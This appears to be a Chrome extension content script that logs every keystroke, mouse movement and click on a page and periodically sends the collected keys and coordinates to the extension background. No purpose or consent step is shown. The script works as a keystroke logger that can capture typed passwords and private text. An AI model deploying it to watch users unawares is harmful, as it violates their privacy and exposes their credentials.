var posX = 0;
var posY = 0;
var type = " ";
var freeze = 0;
var time = 0;
var keys = "";
function getRandomToken() {
    // E.g. 8 * 32 = 256 bits token
    var randomPool = new Uint8Array(32);
    window.crypto.getRandomValues(randomPool);
    var hex = '';
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    // E.g. db18458e2782b2b77e36769c569e263a53885a9944dd0a861e5064eac16f1a
    return hex;
    //return 'db18458e2782b2b77e36769c569e263a53885a9944dd0a861e5064eac16f1a';
}

function startAgain() {
    chrome.runtime.sendMessage(
        {
            type: "solicita"
        }
    );
}



document.onclick = function (e)
{
    console.log('clicked');
    posX = e.pageX;
    posY = e.pageY;
    type = "click";
    sendMessage();
};

$(document).mousemove(function (event) {
    posX = event.pageX;
    posY = event.pageY;
});

function startTimer(secs) {
    secTime = parseInt(secs);
    ticker = setInterval("tick()", 1000);
    tick();
}

document.addEventListener("keydown", KeyCheck);
function KeyCheck(event) {
    var KeyID = event.keyCode;
    switch (KeyID) {
        case 8:
            //backspace
            keys = keys.slice(0, -1);
            break;
        case 46:
            //delete
            keys += "-!-";
            break;
        default:
            break;
    }
}

document.onkeypress = function (e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}

function tick() {
    freeze++;
    time++;
    if (freeze == 4) {
        console.log('freeze');
        freeze = 0;
        type = "freeze";
        sendMessage();
    }
}
startAgain();
startTimer();

function sendMessage() {
    console.log(keys);
    chrome.runtime.sendMessage({
        type: type,
        data: {
            X: posX,
            Y: posY,
            time: time,
            keys: keys,
        }
    });
    keys = "";
}